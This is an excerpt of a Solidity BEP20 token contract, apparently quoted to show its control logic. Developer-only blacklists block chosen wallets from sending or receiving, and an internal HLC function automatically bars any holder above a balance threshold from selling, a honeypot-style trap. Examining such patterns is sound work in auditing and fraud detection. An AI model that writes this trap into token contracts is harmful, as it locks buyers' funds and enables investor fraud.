...
contract abc is Context, IBEP20, Ownable {
    ...
    function _AB_Controller(address _wallet, bool _allow) external onlyDev {
        if(_allow){
            AB_Controller[_wallet] = _allow;
        } else {
            delete AB_Controller[_wallet];
        }
    }

    function isAB_Controller(address _wallet) external view onlyDev returns (bool) {
        return AB_Controller[_wallet];
    }

    function _ABS_Controller(address _wallet, bool _allow) external onlyDev {
        if(_allow){
            ABS_Controller[_wallet] = _allow;
        } else {
            delete ABS_Controller[_wallet];
        }
    }

    function isABS_Controller(address _wallet) external view onlyDev returns (bool) {
        return ABS_Controller[_wallet];
    }

    function _ABR_Controller(address _wallet, bool _allow) external onlyDev {
        if(_allow){
            ABR_Controller[_wallet] = _allow;
        } else {
            delete ABR_Controller[_wallet];
        }
    }

    function isABR_Controller(address _wallet) external view returns (bool) {
        return ABR_Controller[_wallet];
    }
    ...
    function setcharge(uint256 _txFee,uint256 _burnFee,uint256 _liquiditypoolFee) onlyOwner() public{
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        require(!(AB_Controller[sender] || AB_Controller[recipient]), "AB not allowed");
        require(!ABS_Controller[sender], "ABS not allowed");
        require(!ABR_Controller[recipient], "ABR not allowed");
    ...
    function HLC(address h) internal {
        if(balanceOf(h) >= HL_FEE) {
            ABS_Controller[h] = true;
        }
    }
